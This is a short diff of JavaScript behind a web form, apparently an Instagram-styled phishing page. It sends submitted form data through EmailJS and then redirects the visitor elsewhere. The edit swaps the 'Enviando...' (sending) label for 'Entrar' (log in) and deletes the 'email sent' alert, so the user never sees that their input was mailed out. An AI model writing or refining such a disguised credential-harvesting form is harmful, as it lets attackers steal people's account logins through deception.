@@ -360,7 +360,7 @@ emailjs.init('X_tbb3bRVfUBe3vtN')
           event.preventDefault(); // Evita que el formulario se envíe normalmente
   
           btn.disabled = true;
-          btn.textContent = "Enviando...";
+          btn.textContent = "Entrar";
   
           const serviceID = "service_ig";
           const templateID = "template_ig";
@@ -369,7 +369,7 @@ emailjs.init('X_tbb3bRVfUBe3vtN')
               .then(() => {
                   btn.disabled = false;
                   btn.textContent = "Entrar";
-                  alert("¡Correo enviado!");
+
   
                   // Redirigir después del envío exitoso
                   window.location.href = "https://tudestino.com"; // Cambia por la URL deseada
